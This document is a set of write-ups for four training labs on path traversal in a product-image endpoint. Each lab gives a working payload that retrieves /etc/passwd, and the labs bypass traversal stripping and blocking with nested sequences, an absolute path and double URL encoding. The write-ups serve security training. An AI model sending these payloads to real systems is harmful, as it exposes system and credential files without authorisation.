
# Lab 1

## Description

This lab contains a path traversal vulnerability in the display of product images.

To solve the lab, retrieve the contents of the `/etc/passwd` file.

## Solution

Looking at a random picture:

```
/image?filename=38.jpg
```

sending a basic path traversal payload:

```
/image?filename=../../../../../../../../../etc/passwd
```

reveals the `/etc/passwd` file.


# Lab 2

## Description

This lab contains a path traversal vulnerability in the display of product images.

The application blocks traversal sequences but treats the supplied filename as being relative to a default working directory.

To solve the lab, retrieve the contents of the `/etc/passwd` file.

## Solution

That's like not even path traversal?

```
/image?filename=/etc/passwd
```


# Lab 3

## Description

This lab contains a path traversal vulnerability in the display of product images.

The application strips path traversal sequences from the user-supplied filename before using it.

To solve the lab, retrieve the contents of the `/etc/passwd` file.


## Solution

The description says the `application strips` path traversal sequences. Assumption: string looking like `../` are removed. Simple bypass:

```
/image?filename=....//....//....//....//....//....//etc//passwd
```

which returns the `/etc/passwd` file.


# Lab 4

## Description

This lab contains a path traversal vulnerability in the display of product images.

The application blocks input containing path traversal sequences. It then performs a URL-decode of the input before using it.

To solve the lab, retrieve the contents of the `/etc/passwd` file.

## Solution

Given the description some kind of URL encoding is needed. Using `cyberchef`:

```
https://gchq.github.io/CyberChef/
```

and URL encoding special characters results in:

```
/image?filename=%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd
```

Which doesn't work. Trying double URL encoding with:

```
/image?filename=%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd
```

solves the lab.

